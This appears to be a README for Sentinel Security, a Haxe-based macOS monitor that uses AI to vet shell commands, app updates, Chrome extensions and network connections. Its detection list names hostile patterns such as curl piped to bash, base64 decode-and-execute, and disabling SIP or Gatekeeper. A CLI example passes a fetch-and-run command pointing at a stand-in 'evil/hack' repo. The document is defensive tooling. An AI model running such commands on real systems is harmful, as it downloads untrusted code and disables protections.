# 🛡 Sentinel Security

**AI-powered macOS security monitor** — written in Haxe, compiles to native via HashLink or C++.

---

## What It Does

| Module | What It Monitors | How It Decides |
|--------|-----------------|----------------|
| **TerminalWatcher** | Shell commands (zsh/bash history + preexec hook) | Heuristic rules → GitHub repo fetch → AI analysis + macOS codesign |
| **UpdateMonitor** | App update prompts (Info.plist + Sparkle feeds) | Version lookup → domain check → AI validation |
| **ExtensionMonitor** | Chrome extensions (manifest.json permissions) | Dangerous permission check → AI analysis → Chrome policy block |
| **NetworkMonitor** | Per-app TCP/UDP connections (via lsof) | Suspicious port detection → rapid connection alerting |

---

## Architecture

```
sentinel/
├── src/sentinel/
│   ├── Main.hx                    # Daemon entry point
│   ├── CLI.hx                     # CLI tool entry point
│   ├── config/
│   │   └── Config.hx              # Config system (~/.sentinel/config.json)
│   ├── core/
│   │   ├── EventBus.hx            # Inter-module event bus
│   │   ├── IModule.hx             # Module interface
│   │   └── Logger.hx              # File + console logger
│   ├── ai/
│   │   ├── AIEngine.hx            # AI abstraction (Ollama / Anthropic / OpenAI)
│   │   └── GitHubFetcher.hx       # GitHub API + raw file fetcher
│   ├── modules/
│   │   ├── TerminalWatcher.hx     # Shell command interceptor
│   │   ├── UpdateMonitor.hx       # App update validator
│   │   ├── ExtensionMonitor.hx    # Chrome extension auditor
│   │   └── NetworkMonitor.hx      # Connection tracker
│   └── platform/
│       ├── MacSecurity.hx         # codesign + spctl + XProtect wrappers
│       └── Signal.hx              # SIGINT/SIGTERM for native builds
├── build.hxml                     # Default (HashLink bytecode)
├── build-hl.hxml                  # HashLink .hl
├── build-hlc.hxml                 # HashLink/C → compile with CMake
├── build-cpp.hxml                 # C++ via hxcpp
├── build-cli.hxml                 # CLI tool
├── CMakeLists.txt                 # For HashLink/C native binary
├── sentinel.entitlements          # macOS entitlements
├── com.sentinel.security.plist    # LaunchAgent
└── install.sh                     # Installer
```

---

## Compile Targets

### Option 1: HashLink Bytecode (fastest to build, great for dev)
```bash
brew install haxe hashlink
haxe build-hl.hxml
hl build/sentinel.hl
```

### Option 2: HashLink/C → Native binary (recommended for production)
```bash
haxe build-hlc.hxml
mkdir -p build/hlc && cd build/hlc
cmake ../.. -DCMAKE_BUILD_TYPE=Release
make -j$(sysctl -n hw.ncpu)
./sentinel
```

### Option 3: C++ via hxcpp (full native, largest binary)
```bash
haxelib install hxcpp
haxe build-cpp.hxml
./build/cpp/Main
```

---

## AI Configuration

Sentinel defaults to **local AI via Ollama** — no API key needed, fully private.

```json
// ~/.sentinel/config.json
{
  "ai": {
    "provider": "local",          // "local" | "anthropic" | "openai"
    "localModel": "llama3",       // or "mistral", "codellama", "phi3"
    "localEndpoint": "http://localhost:11434",
    "anthropicKey": "",           // optional
    "anthropicModel": "claude-sonnet-4-20250514",
    "openaiKey": "",              // optional
    "blockThreshold": 0.85,       // auto-block above this risk score
    "warnThreshold": 0.50         // warn above this, allow below
  }
}
```

### Setting up local AI (Ollama)
```bash
brew install ollama
ollama serve &
ollama pull llama3        # 4.7GB — general purpose, good at JSON
# or: ollama pull codellama # better for code analysis
```

---

## Terminal Command Blocking

Sentinel watches shell history passively, but can **actively block commands** with a shell hook:

```bash
# Add to ~/.zshrc:
source ~/.sentinel/sentinel-hook.zsh
```

This uses `zsh preexec` to send each command to Sentinel's Unix socket BEFORE execution. Sentinel responds with `ALLOW`, `WARN:<reason>`, or `BLOCK`.

### What triggers analysis:
- `curl ... | bash` or `bash <(curl ...)`
- `brew tap nonofficial/repo`
- Base64 decode + execute patterns
- `sudo` + network download
- `csrutil disable`, `spctl --master-disable`
- `launchctl load` with plist files
- `DYLD_INSERT_LIBRARIES` injection
- Any command referencing a GitHub URL

### GitHub repo analysis pipeline:
1. Extract owner/repo from command
2. Fetch via GitHub API: stars, forks, age, owner account age
3. Download: README, install.sh, Formula, package.json
4. Run AI analysis on all of the above
5. Check repo file list for pre-built binaries (triggers codesign warning)
6. macOS codesign/Gatekeeper check on any downloaded binaries

---

## Chrome Extension Blocking

When an extension is flagged:

1. **Chrome Policy file** written to block all network access:
   `~/Library/Application Support/Google/Chrome/policies/recommended/sentinel-policy.json`

2. **Chrome Preferences** modified to disable the extension (if `autoDisable: true`)

3. macOS notification shown with risk details

### Dangerous permissions that trigger analysis:
`<all_urls>`, `tabs`, `webRequest`, `webRequestBlocking`, `nativeMessaging`,
`debugger`, `cookies`, `history`, `clipboardRead`, `clipboardWrite`

---

## Update Validation

For each app update popup detected:

1. Read `Info.plist` → extract current version, `SUFeedURL`, bundle ID
2. Fetch Sparkle appcast or GitHub releases for latest legitimate version
3. Check download URL domain against trusted list
4. AI analysis: is the domain legitimate? version jump suspicious? fake update popup?

---

## CLI Usage

```bash
# Analyze a potentially malicious command
sentinel-cli analyze-cmd "bash <(curl -fsSL https://raw.githubusercontent.com/evil/hack/main/install.sh)"

# Analyze a GitHub repo directly
sentinel-cli analyze-repo https://github.com/someuser/suspicious-tool

# Check binary signatures
sentinel-cli codesign /Applications/SomeDownloadedApp.app

# Check a Chrome extension
sentinel-cli check-extension ~/Downloads/extension/manifest.json

# Validate an app update
sentinel-cli check-update /Applications/SomeApp.app/Contents/Info.plist
```

---

## macOS Security Tools Used (No Extra Install)

| Tool | Purpose |
|------|---------|
| `codesign` | Verify binary signatures + entitlements |
| `spctl` | Gatekeeper assessment |
| `xattr` | Quarantine attribute checking |
| `plutil` | Parse binary/XML plists |
| `lsof -i` | Per-app network connections |
| `osascript` | macOS notifications |
| `nc -U` | Unix socket communication (shell hook) |

---

## Security Philosophy

- ✅ **SIP stays ON** — Sentinel never asks you to disable System Integrity Protection
- ✅ **No kernel extension** — uses only user-space tools
- ✅ **Local AI by default** — your commands never leave your machine
- ✅ **Open source** — audit every decision Sentinel makes
- ✅ **Fail open** — if AI is unavailable, Sentinel warns but doesn't block
